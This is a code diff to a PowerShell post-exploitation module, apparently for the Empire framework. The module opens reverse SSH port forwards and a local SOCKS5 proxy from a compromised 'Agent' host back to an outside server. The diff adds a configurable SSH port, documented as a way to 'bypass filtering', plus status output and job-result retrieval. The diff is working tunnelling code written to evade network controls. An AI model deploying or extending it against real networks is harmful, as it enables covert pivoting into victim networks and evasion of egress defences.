@@ -3,6 +3,7 @@
 # reverse port forward job definition
 $startReverseForward = {
     Param([string]$sshhost, 
+    [int]$sshServerPort,
     [string]$username,
     [string]$password,
     [int]$RemotePort, 
@@ -18,7 +19,7 @@ $startReverseForward = {
 
     $authmethod = New-Object Renci.SshNet.PasswordAuthenticationMethod($username, $password)
 
-    $conninfo = New-Object Renci.SshNet.ConnectionInfo $sshhost, $username, $authmethod
+    $conninfo = New-Object Renci.SshNet.ConnectionInfo $sshhost, $sshServerPort, $username, $authmethod
 
     $client = New-Object Renci.SshNet.SshClient $conninfo
 
@@ -30,7 +31,7 @@ $startReverseForward = {
     $client.AddForwardedPort($portfwd)
     
     $portfwd.Start()
-
+    Write-host "Connection established.."
     #this probably never gets executed, the job is usually killed at this point
     while ($true) {}
     $portfwd.Stop()
@@ -53,7 +54,7 @@ $StartSocksProxy = {
     # start a socks proxy
     $proxy = new-object socks5.Socks5Server "127.0.0.1", $LocalPort
     $proxy.Start()
-
+    Write-host "local proxy started.."
     while($true){}
 }
 
@@ -77,6 +78,10 @@ Sets up a reverse port forward from the Agent back to an external server, it the
 
 Host to tunnel out to
 
+.PARAMETER sshserverport
+
+target ssh server port. Defaults to 22, try others to bypass filtering
+
 .PARAMETER username
 
 Username to connect to SSH server with
@@ -99,6 +104,7 @@ function Start-SocksProxy(){
 
     [CmdletBinding()]
     Param([string]$sshhost, 
+    [int]$sshServerPort=22,
     [string]$username,
     [string]$password,
     [int]$RemotePort,
@@ -106,9 +112,10 @@ function Start-SocksProxy(){
     )
 
     start-job -ScriptBlock $StartSocksProxy -Name SSHJOB.PROXY -ArgumentList $sshhost, $username, $password, $RemotePort, $LocalPort 
-    start-job -ScriptBlock $startReverseForward -Name SSHJOB -ArgumentList $sshhost, $username, $password, $RemotePort, "127.0.0.1", $LocalPort
+    start-job -ScriptBlock $startReverseForward -Name SSHJOB -ArgumentList $sshhost, $sshServerPort, $username, $password, $RemotePort, "127.0.0.1", $LocalPort
     write-host "Reverse port forward job started.. on local port ",$sshost, " port ", $RemotePort 
-
+    sleep 5 # lets just sleep a bit then grab the job status before returning. With Empire this is useful
+    get-job | Receive-Job
 }
 function Start-ReversePortForward() {
 <#
@@ -127,6 +134,10 @@ Sets up a reverse port forward from the Agent back to an external server.
 .PARAMETER Host
 
 Host to connect the SSH tunnel to
+
+.PARAMETER sshserverport
+
+target ssh server port. Defaults to 22, try others to bypass filtering
 
 .PARAMETER Username
 
@@ -161,7 +172,8 @@ Destination Port to forward traffic to
     [string]$password,
     [int]$RemotePort, 
     [String]$DestHost, 
-    [int]$DestPort
+    [int]$DestPort,
+    [int]$sshServerPort
     )
     $jobs = Get-Job -Name SSHJOB -ErrorAction SilentlyContinue
     if ($jobs -ne $null ){
@@ -169,7 +181,7 @@ Destination Port to forward traffic to
         return
     }
 
-    start-job -ScriptBlock $startReverseForward -Name SSHJOB -ArgumentList $sshhost, $username, $password, $RemotePort, $DestHost, $DestPort
+    start-job -ScriptBlock $startReverseForward -Name SSHJOB -ArgumentList $sshhost, $sshServerPort, $username, $password, $RemotePort, $DestHost, $DestPort
     write-host "Reverse port forward job started.."
     
 }
